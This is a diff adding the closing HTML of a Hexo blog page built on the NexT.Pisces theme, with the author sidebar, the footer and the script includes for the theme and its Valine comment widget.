+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
